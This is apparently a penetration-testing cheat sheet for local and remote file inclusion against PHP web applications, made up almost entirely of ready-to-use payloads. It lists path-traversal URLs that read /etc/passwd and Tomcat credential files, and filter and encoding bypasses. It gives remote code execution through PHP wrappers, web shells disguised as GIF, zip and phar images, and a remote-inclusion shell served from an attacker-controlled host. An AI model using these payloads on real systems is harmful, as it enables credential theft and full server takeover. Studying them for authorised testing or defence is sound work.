## Local File Inclusion / Remote File Inclusion

### Basic LFI

```
/index.php?language=/etc/passwd
/index.php?language=../../../../etc/passwd
/index.php?language=/../../../etc/passwd
/index.php?language=./languages/../../../../etc/passwd
/index.php?language=../../../../../../usr/share/tomcat9/etc/tomcat-users.xml
/index.php?language=../../../../../../usr/share/tomcat9/conf/tomcat-users.xml
/index.php?language=../../../../../../etc/tomcat9/tomcat-users.xml
```

### LFI Bypasses
```
 /index.php?language=....//....//....//....//etc/passwd
 /index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
 /index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
 /index.php?language=../../../../etc/passwd%00
 /index.php?language=php://filter/read=convert.base64-encode/resource=config
```

### RCE using PHP Wrappers
```
/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```


### LFI + Upload
```
#create malicious image
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
/index.php?language=./profile_images/shell.gif&cmd=id


#create malicious zip archive 'as jpg'
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
/index.php?language=zip://shell.zip%23shell.php&cmd=id

#create malicious phar 'as jpg'
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```


### RFI

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>
/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```